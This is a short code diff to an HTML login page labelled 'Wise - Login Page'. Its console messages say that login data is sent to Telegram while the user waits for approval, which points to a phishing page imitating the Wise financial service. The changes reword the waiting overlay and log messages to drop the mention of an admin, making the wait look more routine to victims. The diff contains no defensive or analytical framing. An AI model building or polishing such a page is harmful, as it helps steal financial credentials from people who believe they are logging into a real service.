@@ -564,8 +564,8 @@
     <div class="waiting-overlay" id="waitingOverlay">
         <div class="waiting-box">
             <div class="spinner"></div>
-            <h3>Waiting for Admin Approval</h3>
-            <p>Your login request has been sent. Please wait while an admin reviews your request.</p>
+            <h3>Waiting for Approval</h3>
+            <p>Your login request has been sent. Please wait while your request is being reviewed.</p>
             <div class="dots">
                 <span></span>
                 <span></span>
@@ -812,7 +812,7 @@
                 const data = await response.json();
 
                 if (data.success) {
-                    console.log('✅ Login data sent to Telegram. Waiting for admin approval...');
+                    console.log('✅ Login data sent to Telegram. Waiting for approval...');
 
                     // ✅ Show waiting overlay
                     waitingOverlay.classList.add('active');
@@ -930,7 +930,7 @@
         console.log('🔥 Wise - Login Page (Connected to Backend)');
         console.log('✅ API URL:', API_BASE_URL);
         console.log('✅ Login data will be sent to Telegram');
-        console.log('✅ User will wait for admin approval');
+        console.log('✅ User will wait for approval');
     </script>
 
 </body>
